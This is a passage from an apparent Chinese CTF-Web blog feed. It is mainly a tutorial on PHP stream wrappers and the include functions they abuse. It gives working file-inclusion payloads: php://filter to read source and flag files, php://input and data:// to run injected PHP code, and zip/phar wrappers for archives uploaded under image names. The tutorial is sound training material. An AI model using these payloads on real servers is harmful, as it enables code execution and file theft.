class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgrep [选项] &lt;进程名称&gt;</span><br></pre></td></tr></table></figure><p>其中，<code>&lt;进程名称&gt;</code> 是要匹配的进程名称或模式。可以使用<strong>通配符进行模糊匹配</strong>。</p><table><thead><tr><th>可选选项</th><th>说明</th></tr></thead><tbody><tr><td>-u &lt;用户名&gt;</td><td>根据用户名过滤进程。</td></tr><tr><td>-n</td><td>仅返回最新的匹配进程的进程 ID。</td></tr><tr><td>-x</td><td>精确匹配进程名称，不进行模糊匹配。</td></tr><tr><td>-d &lt;分隔符&gt;</td><td>指定输出的分隔符，默认为换行符。</td></tr></tbody></table><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p>参考<strong>菜鸟教程</strong>的文章</p><p>原文链接：<a href="https://www.runoob.com/linux/linux-user-manage.html">Linux 用户和用户组管理 | 菜鸟教程 (runoob.com)</a>、<a href="https://www.runoob.com/linux/linux-comm-find.html">Linux find 命令 | 菜鸟教程 (runoob.com)</a></p></li><li><p>参考腾讯云开发者社区博主<strong>全栈程序员站长</strong>的文章</p><p>原文链接：<a href="https://cloud.tencent.com/developer/article/2054395">史上最全的Linux常用命令汇总（超全面！超详细！）收藏这一篇就够了！-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;用户管理&quot;&gt;&lt;a href=&quot;#用户管理&quot; class=&quot;headerlink&quot; title=&quot;用户管理&quot;&gt;&lt;/a&gt;&lt;strong&gt;用户管理&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;创建指令&quot;&gt;&lt;a href=&quot;#创建指令&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="操作系统" scheme="https://we11s.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
  </entry>
  
  <entry>
    <title>Docker知识</title>
    <link href="https://we11s.github.io/posts/4126800539/"/>
    <id>https://we11s.github.io/posts/4126800539/</id>
    <published>2023-12-25T14:19:38.000Z</published>
    <updated>2024-03-12T16:34:03.846Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施工中"><a href="#施工中" class="headerlink" title="施工中"></a>施工中</h1><p><img src="/img/edit.png" alt="施工中"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;施工中&quot;&gt;&lt;a href=&quot;#施工中&quot; class=&quot;headerlink&quot; title=&quot;施工中&quot;&gt;&lt;/a&gt;施工中&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/edit.png&quot; alt=&quot;施工中&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="开发" scheme="https://we11s.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
  </entry>
  
  <entry>
    <title>常见协议与PHP伪协议</title>
    <link href="https://we11s.github.io/posts/2344074049/"/>
    <id>https://we11s.github.io/posts/2344074049/</id>
    <published>2023-11-10T14:47:11.000Z</published>
    <updated>2024-05-29T17:55:14.248Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见协议与封装协议"><a href="#常见协议与封装协议" class="headerlink" title="常见协议与封装协议"></a><strong>常见协议与封装协议</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流(I/O streams)</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据(RFC 2397)</span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>访问本地文件系统，若不加协议名称，<strong>默认封装协议</strong>为<code>file://</code>协议</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :off&#x2F;on</li></ul><p><strong>作用：</strong><br>用于访问本地文件系统（服务器中的文件），在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p><p><strong>说明：</strong><br><strong>当不说明使用file:&#x2F;&#x2F;协议的时（即默认file:&#x2F;&#x2F;协议的情况）可以使用相对路径，当使用了file协议时无法使用相对路径。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=file://flag #用法错误，声明file协议时无法使用相对路径</span><br><span class="line">cmd=file:///flag #用法正确，使用绝对路径</span><br><span class="line">cmd=/flag #用法正确，使用绝对路径</span><br><span class="line">cmd=flag #用法正确，使用相对路径</span><br></pre></td></tr></table></figure><p><strong>相对路径</strong></p><p>当指定了一个<strong>相对路径</strong>提供的路径将基于<strong>当前的目录</strong>。在很多情况下是脚本所在的目录。</p><ul><li><p>Windows：不以:&#x2F;&#x2F;indows 盘符开头的路径</p></li><li><p>Linux:不以&#x2F;开头的路径</p></li></ul><p><strong>使用示例</strong>：以传参变量名为cmd演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line">cmd=file:<span class="comment">///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条</span></span><br><span class="line">cmd=/path/to/flag <span class="comment">#根目录下path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=relative/path/flag <span class="comment">#当前目录下relative文件夹中path文件夹下flag文件</span></span><br><span class="line">cmd=flag <span class="comment">#当前目录下的flag文件</span></span><br><span class="line"><span class="comment">#Windows</span></span><br><span class="line">cmd=file:<span class="comment">//C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=file:<span class="comment">//C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=C:\path\to\flag <span class="comment">#C盘中path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=flag  <span class="comment">#当前文件夹下flag文件</span></span><br></pre></td></tr></table></figure><h2 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h2><p> 访问 HTTP(s) 网址</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:on</li><li>allow_url_include:on</li></ul><p><strong>作用：</strong><br>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于<strong>远程包含。</strong></p><p><strong>使用示例</strong>：以传参变量名为cmd演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=http:<span class="comment">//example.com/phpinfo.txt#读取http://example.com/phpinfo.txt文件</span></span><br><span class="line">cmd=https:<span class="comment">//example.com/file.php?var1=val1&amp;var2=val2#读取https://example.com/file.php文件并且传入var1和var2的值</span></span><br></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p> 访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据</p><p><strong>常见的PHP伪协议：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。</span><br><span class="line">php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。</span><br><span class="line">php://stdin #用于访问标准输入流。</span><br><span class="line">php://stdout #用于访问标准输出流。</span><br><span class="line">php://stderr #用于访问标准错误输出流。</span><br><span class="line">php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。</span><br><span class="line">php://memory #用于在内存中创建可读写的数据流。</span><br><span class="line">php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。</span><br><span class="line">php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。</span><br><span class="line">php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。</span><br></pre></td></tr></table></figure><p>在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行POST参数中的php代码。</p><p><strong>作用：</strong><br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :仅<code>php://input</code> 、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要on</li></ul><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h3><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :off&#x2F;on</li></ul><p><strong>作用：</strong></p><p><code>php://filter</code>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理。（即读取或写入数据之前对其进行修改或过滤。）</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。（<strong>加绝对路径</strong>）</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>read参数指定 一个或多个过滤器 用于<strong>读</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出）</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>write参数指定 一个或多个过滤器 用于<strong>写</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件）</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表<strong>会视情况应用于读或写链</strong>。</td></tr></tbody></table><p>注：</p><ul><li><code>read</code> 和 <code>write</code> 指令是互斥的，不能同时使用。</li><li>如果存在多个过滤器，字符串从左到右的顺序经过过滤器</li></ul><p><code>write</code>指令用于写入文件，对字符串编码后写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 将 &quot;Hello World&quot; 进行base64编码然后写入根目录flag.txt文件 */</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;php://filter/write=convert.base64-encode/resource=/flag.txt&quot;</span>,<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>常用过滤语句：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码</span></span><br></pre></td></tr></table></figure><h4 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a><strong>常用过滤器</strong></h4><blockquote><p>PHP 版本中的过滤器也许比这里列出的更多（或更少），可用 <code>stream_get_filters()</code>来列出 PHP 中已安装的过滤器。</p><p>以docker的PHP8.3.4为例，自带的过滤器有</p><ul><li>zlib.* </li><li>convert.iconv.*</li><li>string.rot13 </li><li>string.toupper</li><li>string.tolower</li><li>convert.* </li><li>dechunk</li><li>consumed (目前也不知道是啥)</li></ul></blockquote><h5 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a><strong>字符串过滤器</strong></h5><ul><li><p><code>string.rot13</code>（对字符串执行<code>ROT13</code>编码转换）</p></li><li><p><code>string.toupper</code>（将字符串转化为大写）</p></li><li><p><code>string.tolower</code>（将字符串转化为小写）</p></li><li><p><code>string.strip_tags</code>(自 PHP 7.3.0 起废弃，从字符串中去除 HTML 和 PHP 标记)</p></li></ul><blockquote><p>官方文档：</p><p><a href="https://www.php.net/manual/zh/filters.string.php">PHP: 字符串过滤器 - Manual</a></p></blockquote><h5 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a><strong>转换过滤器</strong></h5><p>注：转换过滤器是 PHP 5.0.0 添加的</p><ul><li><code>convert.base64-encode</code>和<code> convert.base64-decode</code>（将字符串进行base64编码加解密）</li><li><code>convert.quoted-printable-encode</code> 和 <code>convert.quoted-printable-decode</code>（将字符串进行Quoted-printable编码加解密）<ul><li><a href="https://zhuanlan.zhihu.com/p/235588441">Quoted-Printable 编码 - 知乎 (zhihu.com)</a></li></ul></li><li><code>convert.iconv.*</code>（将字符串进行字符编码转化）</li></ul><blockquote><p>官方文档：</p><p><a href="https://www.php.net/manual/zh/filters.convert.php">PHP: 转换过滤器 - Manual</a></p></blockquote><p><strong>压缩过滤器</strong></p><p>压缩过滤器可以在网络的流中提供通用压缩，将一个非压缩的流转换成一个压缩流。可以在任何时候应用于任何流资源。</p><blockquote><p>官方文档：</p><p><a href="https://www.php.net/manual/zh/filters.compression.php">PHP: 压缩过滤器 - Manual</a></p></blockquote><p><strong>加密过滤器</strong>（已自 PHP 7.1.0 起废弃）</p><p>加密过滤器特别适用于文件&#x2F;数据流的加密。</p><blockquote><p>官方文档：</p><p><a href="https://www.php.net/manual/zh/filters.encryption.php">PHP: 加密过滤器 - Manual</a></p></blockquote><p><strong>dechunk</strong></p><p>将HTTP分块Chunk传输的数据进行解码</p><blockquote><p>HTTP分块Chunk传输：</p><p><a href="https://cloud.tencent.com/developer/article/2399979">告别等待！HTTP分块Chunk传输让客户端响应更迅速数据即时呈现-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></blockquote><p>注：比较特别的是，进行解码的数据流<strong>每行都有后缀</strong><code>CRLF</code>（即<code>\r\n</code>），否则将得到空字符串</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>主要用来接收post数据。</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :on</li></ul><p><strong>说明：</strong></p><p>CTF中文件包含题目里，可以使用<code>php://input</code>协议，将post请求中的数据作为php代码执行。</p><p><strong>使用示例</strong>：以传参变量名为file演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[URL部分]</span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">[POST DATA部分]</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;</h2><p> 压缩流</p><p><strong>条件</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :off&#x2F;on</li></ul><p><strong>作用</strong></p><p>​<code>zip://</code> &amp; <code>bzip2://</code> &amp; <code>zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，<strong>更重要的是不需要指定后缀名，可修改为任意后缀</strong>：jpg、png、gif等等。</p><p><strong>注</strong>：<code>zlib://</code> 需要是服务器内的压缩包文件、但不局限于后缀名</p><p><strong>示例：</strong></p><p>1、 zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</p><p><strong>注意：</strong><code>#</code>需要URL编码为<code>%23</code>，传入时不要加上<code>[ ]</code></p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt</span><br></pre></td></tr></table></figure><p>2、compress.bzip2:&#x2F;&#x2F;file.bz2<br>压缩 phpinfo.txt 为 phpinfo.bz2 并上传(同样支持任意后缀名)，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.bzip2:///var/www/html/phpinfo.bz2</span><br></pre></td></tr></table></figure><p>3、compress.zlib:&#x2F;&#x2F;file.gz<br>压缩 phpinfo.txt 为 phpinfo.gz 并上传(同样支持任意后缀名)，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib:///var/www/html/phpinfo.gz</span><br></pre></td></tr></table></figure><h2 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</p><p>例如,上传压缩包到目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><h2 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p><strong>条件</strong></p><ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul><p><strong>作用</strong><br>自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。<strong>通常可以用来执行PHP代码。</strong></p><p><strong>用法</strong></p><ul><li><code>data://text/plain,[加上所需传输的经过url编码数据]</code></li><li><code>data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据]</code></li></ul><p>注意：传入时不要加上<code>[ ]</code></p><p><strong>示例</strong>：</p><ul><li>data:&#x2F;&#x2F;text&#x2F;plain,</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>data:&#x2F;&#x2F;text&#x2F;plain;base64,</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><strong>使用场景</strong></h1><p>当遇到文件包含可使用伪协议进行</p><p>可能遇到的文件包含函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">require</span><br><span class="line">include_once</span><br><span class="line">require_once</span><br><span class="line">highlight_file</span><br><span class="line">show_source</span><br><span class="line">flie</span><br><span class="line">readfile</span><br><span class="line">file_get_contents </span><br><span class="line">file_put_contents</span><br><span class="line">fopen</span><br></pre></td></tr></table></figure><h2 id="include和require函数"><a href="#include和require函数" class="headerlink" title="include和require函数"></a>include和require函数</h2><p>​通过 include 或 require 语句，可以将 <strong>PHP 文件</strong>的内容插入另一个 PHP 文件(<strong>在服务器执行它之前</strong>)。</p><p><code>include</code> 和 <code>require</code> 语句是相同的，<strong>除了错误处理方面</strong>：</p><p><code>require</code> 会生成致命错误(E_COMPILE_ERROR)并停止脚本、<code>include</code> 只生成警告(E_WARNING)，并且脚本会继续</p><p><strong>语法：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;filename&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;filename&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>区别：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &#x27;23333.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由于23333.php不存在<br>使用include的时候，只会在当前语句报错，然后执行后边的正常语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require</span> <span class="string">&#x27;23333.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是使用require的时候，就会直接报错然后跳出函数。</p><h2 id="include-once和require-once函数"><a href="#include-once和require-once函数" class="headerlink" title="include_once和require_once函数"></a>include_once和require_once函数</h2><p>​<code>include_once</code> (<code>require_once</code>)语句在脚本执行期间包含并运行指定文件。此行为和 <code>include (require)</code>语句类似，区别是如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once(require_once)需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种情况下1.php被包含两次。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种情况下，第二次包含时，是不会进行包含的。</p><h2 id="highlight-file-和show-source"><a href="#highlight-file-和show-source" class="headerlink" title="highlight_file()和show_source()"></a>highlight_file()和show_source()</h2><p>两个函数的用法相同，因为show_source()是highlight_file()的别名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(filename,<span class="keyword">return</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,<span class="keyword">return</span>);</span><br></pre></td></tr></table></figure><p>其中return是可选项</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。要进行高亮处理的 PHP 文件的路径。</td></tr><tr><td>return</td><td>可选。如果设置 true，则本函数返回高亮处理的代码，而不是输出它们。</td></tr></tbody></table><p>​<br>​</p><h2 id="readfile和file-get-contents和file"><a href="#readfile和file-get-contents和file" class="headerlink" title="readfile和file_get_contents和file"></a>readfile和file_get_contents和file</h2><p>三者区别：</p><table><thead><tr><th align="center">名称</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">file</td><td align="center">把整个文件读入一个数组中</td></tr><tr><td align="center">readfile</td><td align="center">读入一个文件并写入到输出缓冲。</td></tr><tr><td align="center">file_get_contents</td><td align="center">将整个文件读入一个字符串</td></tr></tbody></table><p>注：以下提到的<strong>PHP 的内置路径（include_path）</strong>为在<code>php.ini</code>的php配置文件中进行设置的搜索路径。</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a><strong>file_get_contents</strong></h3><p>file_get_contents() 把整个文件读入一个字符串中。<br>该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要读取的文件。</td></tr><tr><td>include_path</td><td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td></tr><tr><td>start</td><td>可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。</td></tr><tr><td>max_length</td><td>可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</td></tr></tbody></table><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a><strong>readfile</strong></h3><p>readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(filename,include_path,context)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。规定要读取的文件。</td></tr><tr><td>include_path</td><td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><h3 id="file-1"><a href="#file-1" class="headerlink" title="file"></a><strong>file</strong></h3><p>与 file_get_contents() 类似，不同的是 file() 将文件读取后作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file</span>(path,include_path,context)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要读取的文件</td></tr><tr><td>include_path</td><td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr></tbody></table><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p><code>file_put_contents()</code> 函数把一个字符串写入文件中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">file_put_contents</span> ( <span class="keyword">string</span> <span class="variable">$filename</span> , <span class="keyword">mixed</span> <span class="variable">$data</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, resource <span class="variable">$context</span> ]] )</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">filename</td><td align="left">必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件</td></tr><tr><td align="center">data</td><td 